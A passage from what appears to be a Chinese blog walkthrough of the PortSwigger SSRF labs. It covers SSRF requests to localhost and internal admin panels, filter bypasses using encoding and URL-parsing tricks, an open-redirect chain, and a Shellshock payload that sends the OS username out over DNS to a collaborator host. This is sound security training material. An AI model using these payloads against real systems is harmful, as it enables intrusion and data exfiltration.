Burp Repeater。\n\n4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。\n\n![](https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png)\n\n5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。\n\n6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。\n\n![](https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png)\n\n## 使用 Shellshock 利用盲SSRF\n\n简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。\n\n### 靶场地址\n\n[web-security/ssrf/blind/lab-shellshock-exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)\n\n### 靶场说明\n\n该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。\n\n为了完成实验，请使用此功能对 8080 端口范围内的内部服务器`192.168.0.X`执行[盲 SSRF](https://portswigger.net/web-security/ssrf/blind)攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。\n\n### 实验步骤\n\n1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，从 BApp Store 安装“Collaborator Everywhere”扩展。\n\n![](https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png)\n\n2、将实验室的域添加到 Burp Suite 的[Scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope)，以便 Collaborator Everywhere 将其作为目标。\n\n浏览网站。\n\n![](https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png)\n\n![](https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png)\n\n3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。\n\n![](https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png)\n\n4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。\n\n![](https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png)\n\n5、将请求发送到产品页面给 Burp Intruder。\n\n6、使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：\n\n```\n() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN\n```\n\n7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。\n\n单击“清除 §”，将 Referer 标头更改为`http://192.168.0.1:8080`突出显示 IP 地址的最后一个八位字节（数字`1`），单击“添加 §”。\n\n![](https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png)\n\n8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。\n\n![](https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png)\n\n9、点击“开始攻击”。\n\n攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。[您应该会看到由成功的盲SSRF 攻击](https://portswigger.net/web-security/ssrf)命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。\n\n![](https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png)\n\n要完成实验，请输入操作系统用户的名称。\n\n![](https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png)\n\n另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。[点击详细阅读](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)。\n\n## 为 SSRF 漏洞寻找隐藏的攻击面\n\n许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。\n\n### 请求中的部分 URL\n\n有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。\n\n### 数据格式中的 URL\n\n一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到[XXE 注入](https://portswigger.net/web-security/xxe)的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看[XXE 注入](https://portswigger.net/web-security/xxe)漏洞时，我们将更详细地介绍这一点。\n\n### 通过Referer头的SSRF\n\n一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅[盲 SSRF 漏洞](https://portswigger.net/web-security/ssrf/blind)。\n\n\n------\n\n\n>参考链接：\n>\n>[Web Security Academy-SSRF](https://portswigger.net/web-security/ssrf)\n>\n>[portswigger ssrf lab 服务器端请求伪造靶场](https://www.ddosi.org/ssrf-lab/)\n>\n>[Web安全学习笔记-4.4 SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)\n>\n>[关于SSRF和多种绕过方式](https://www.freebuf.com/vuls/321535.html)\n>\n>[URL中“#” “？” &“”号的作用](https://www.cnblogs.com/kaituorensheng/p/3776527.html)\n","source":"_posts/PortSwigger-Web-Security-Academy-SSRF.md","raw":"---\ntitle: PortSwigger Web Security Academy-SSRF\ndate: 2022-07-21 14:22:15\ncategories:\n- Web安全\ntags:\n- SSRF\n---\n\n## SSRF简介\n\n**SSRF**（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。\n\n## 漏洞危害\n\nSSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n\n## 常见的 SSRF 攻击\n\n**SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。**这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。\n\n### 针对服务器本身的SSRF攻击\n\n在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如`127.0.0.1`（指向环回适配器的保留 IP 地址）或`localhost`（同一适配器的常用名称）。\n\n例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n```\n\n这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。\n\n在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n```\n\n在这里，服务器将获取`/admin`URL 的内容并将其返回给用户。\n\n当然，攻击者可以直接访问`/admin`URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对`/admin`URL 的请求来自本地机器本身时，会绕过正常的[访问控制。](https://portswigger.net/web-security/access-control)应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。\n\n### 针对其他后端系统的 SSRF 攻击\n\n服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。\n\n在前面的示例中，假设后端 URL 有一个管理界面` https://192.168.0.68/admin`。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n```\n\n## 针对本地服务器的基本SSRF\n\n### 靶场地址\n\n[web-security/ssrf/lab-basic-ssrf-against-localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成这个实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n### 实验步骤\n\n1、浏览`/admin`并观察您无法直接访问管理页面。\n\n![](https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png)\n\n2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n![](https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png)\n\n![](https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png)\n\n3、将`stockApi`参数中 的 URL 更改为`http://localhost/admin`。发送请求包后能看到管理界面。\n\n![](https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png)\n\n4、读取HTML识别删除目标用户的URL，即：`http://localhost/admin/delete?username=carlos`\n\n![](https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png)\n\n5、成功删除carlos用户。\n\n![](https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png)\n\n![](https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png)\n\n### 小结\n\n为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：\n\n- 访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 **当与服务器本身建立连接时，会绕过检查。**\n- 出于灾难恢复的目的，**应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问**。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。\n- 管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。\n\n这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。\n\n## 针对其他后端系统的 SSRF 攻击\n\n### 靶场地址\n\n[web-security/ssrf/lab-basic-ssrf-against-backend-system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请使用库存检查功能`192.168.0.X`在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户`carlos`。\n\n### 实验步骤\n\n简单点说就是上一个实验+爆破url\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。\n\n2、先清除标记，然后将`stockApi`参数中的url更改为`http://192.168.0.1:8080/admin`，并标记IP地址的最后一位，即标记“1”。\n\n![](https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png)\n\n3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。\n\n![](https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png)\n\n4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。\n\n![](https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png)\n\n5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：`/admin/delete?username=carlos`，即可删除`carlos`用户。\n\n![](https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png)\n\n## 常见的 SSRF 防御绕过\n\n通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。\n\n* 绕过基于黑名单的 SSRF防御措施\n\n* 绕过基于白名单的SSRF防御措施\n\n* 通过开放重定向绕过SSRF防御措施\n\n## 基于黑名单的SSRF防御措施绕过\n\n一些应用程序会阻止包含诸如`127.0.0.1`、`localhost`之类的主机名或诸如`/admin`之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：\n\n- 使用替代 IP 表示`127.0.0.1`，例如`2130706433`、`017700000001`或`127.1`。\n- 将您自己的域名解析为`127.0.0.1`. 您可以`spoofed.burpcollaborator.net`用于此目的。\n- 使用 URL 编码或大小写变体混淆被阻止的字符串。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n开发人员部署了两个需要绕过的SSRF 弱防御措施。\n\n### 实验步骤\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`，观察到请求被阻止。\n\n![](https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png)\n\n2、通过将 URL 更改为：`http://localhost/`,还是被防火墙拦截了!\n\n![](https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png)\n\n3、通过双 URL 编码将`a`混淆为 `%25%36%31`,此时为`http://loc%25%36%31lhost/`。防火墙未拦截，成功以管理员身份访问系统。\n\n![](https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png)\n\n4、搜索管理面板url\n\n![](https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png)\n\n5、访问管理面板\n\n![](https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png)\n\n6、又拦截了，再次将admin中的`a`url编码两次提交,绕过防火墙!\n\n![](https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png)\n\n7、删除carlos账户\n\n![](https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png)\n\n8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.\n\n![](https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png)\n\n## 基于白名单的 SSRF防御措施\n\n某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。\n\nURL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：\n\n- 您可以使用`@`字符 在主机名之前的 URL 中嵌入凭据。例如：`https://expected-host@evil-host`\n- 您可以使用`#`字符来指示 URL 片段。例如：`https://evil-host#expected-host`\n- 您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：`https://expected-host.evil-host`\n- 您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。\n- 您可以一起使用这些技术的组合。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-with-whitelist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n**开发人员已经部署了您需要绕过的反 SSRF 防御。**\n\n### 实验思路\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。\n\n![](https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png)\n\n2、将 URL 更改为`http://username@stock.weliketoshop.net/`并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。\n\n![](https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png)\n\n3、将`#`附加到用户名后并观察到该 URL 现在被拒绝。\n\n![](https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png)\n\n4、双 URL 编码`#`为`%2523`，并观察到响应，表明服务器已经访问localhost。\n\n![](https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png)\n\n5、改成如下url:访问到admin页面\n\n![](https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png)\n\n6、要访问管理界面并删除目标用户，请将 URL 更改为：`http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`\n\n![](https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png)\n\n## 通过开放重定向漏洞绕过的 SSRF防御\n\n有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。\n\n在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。\n\n例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：\n\n```bash\n/product/nextProduct?currentProductId=6&path=http://evil-user.net\n```\n\n返回重定向到：\n\n```\nhttp://evil-user.net\n```\n\n您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin\n```\n\n这个 SSRF 漏洞利用有效，因为应用程序首先验证`stockAPI`提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://192.168.0.12:8080/admin`并删除用户`carlos`。\n\n库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。\n\n### 实验思路\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n尝试篡改`stockApi`参数，观察到无法让服务器直接向不同的主机发出请求。\n\n![](https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png)\n\n2、点击“下一个产品”，观察`path`参数被放入重定向响应的Location头中，导致开放重定向。\n\n![](https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png)\n\n3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的`stockApi`参数中。构造payload如下：\n\n``` \n/product/nextProduct?path=http://192.168.0.12:8080/admin\n```\n\n   观察库存检查器是否遵循重定向并向您显示管理页面。\n\n![](https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png)\n\n4、修改路径以删除目标用户：\n\n```\n/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos\n```\n\n![](https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png)\n\n成功删除carlos,完成实验。\n\n## 盲 SSRF 漏洞\n\n盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。\n\n### 什么是盲 SSRF？\n\n当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。\n\n### 盲 SSRF 漏洞的影响是什么？\n\n盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。\n\n### 如何发现和利用盲 SSRF 漏洞\n\n检测盲 SSRF 漏洞最可靠的方法是使用带外 ( [OAST](https://portswigger.net/burp/application-security-testing/oast) ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。\n\n使用带外技术最简单、最有效的方法是使用[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)。您可以使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。\n\n```\n提示:\n在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。\n```\n\n### 带外检测的盲SSRF\n\n简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。\n\n### 靶场地址\n\n[portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)\n\n### 靶场说明\n\n该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。\n\n要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。\n\n```\n注意事项:\n为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。\n```\n\n### 实验步骤\n\n1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，转到 Burp 菜单并启动[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)。\n\n![](https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png)\n\n2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。\n\n![](https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png)\n\n3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。\n\n![](https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png)\n\n5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。\n\n6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。\n\n![](https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png)\n\n## 使用 Shellshock 利用盲SSRF\n\n简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。\n\n### 靶场地址\n\n[web-security/ssrf/blind/lab-shellshock-exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)\n\n### 靶场说明\n\n该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。\n\n为了完成实验，请使用此功能对 8080 端口范围内的内部服务器`192.168.0.X`执行[盲 SSRF](https://portswigger.net/web-security/ssrf/blind)攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。\n\n### 实验步骤\n\n1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，从 BApp Store 安装“Collaborator Everywhere”扩展。\n\n![](https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png)\n\n2、将实验室的域添加到 Burp Suite 的[Scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope)，以便 Collaborator Everywhere 将其作为目标。\n\n浏览网站。\n\n![](https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png)\n\n![](https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png)\n\n3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。\n\n![](https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png)\n\n4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。\n\n![](https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png)\n\n5、将请求发送到产品页面给 Burp Intruder。\n\n6、使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：\n\n```\n() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN\n```\n\n7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。\n\n单击“清除 §”，将 Referer 标头更改为`http://192.168.0.1:8080`突出显示 IP 地址的最后一个八位字节（数字`1`），单击“添加 §”。\n\n![](https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png)\n\n8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。\n\n![](https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png)\n\n9、点击“开始攻击”。\n\n攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。[您应该会看到由成功的盲SSRF 攻击](https://portswigger.net/web-security/ssrf)命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。\n\n![](https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png)\n\n要完成实验，请输入操作系统用户的名称。\n\n![](https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png)\n\n另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。[点击详细阅读](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)。\n\n## 为 SSRF 漏洞寻找隐藏的攻击面\n\n许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。\n\n### 请求中的部分 URL\n\n有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。\n\n### 数据格式中的 URL\n\n一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到[XXE 注入](https://portswigger.net/web-security/xxe)的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看[XXE 注入](https://portswigger.net/web-security/xxe)漏洞时，我们将更详细地介绍这一点。\n\n### 通过Referer头的SSRF\n\n一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅[盲 SSRF 漏洞](https://portswigger.net/web-security/ssrf/blind)。\n\n\n------\n\n\n>参考链接：\n>\n>[Web Security Academy-SSRF](https://portswigger.net/web-security/ssrf)\n>\n>[portswigger ssrf lab 服务器端请求伪造靶场](https://www.ddosi.org/ssrf-lab/)\n>\n>[Web安全学习笔记-4.4 SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)\n>\n>[关于SSRF和多种绕过方式](https://www.freebuf.com/vuls/321535.html)\n>\n>[URL中“#” “？” 